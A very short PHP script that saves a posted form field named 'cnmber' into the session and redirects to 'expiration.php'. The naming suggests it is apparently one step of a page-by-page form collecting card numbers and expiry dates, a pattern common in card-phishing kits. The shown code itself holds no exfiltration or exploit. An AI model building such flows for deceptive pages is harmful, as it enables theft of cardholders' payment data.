<?php
session_start();


$_SESSION['cnmber'] = "$cnmber";

$cnmber = $_POST['cnmber'];




$_SESSION['cnmber'] = "$cnmber";


header('location: expiration.php');

?>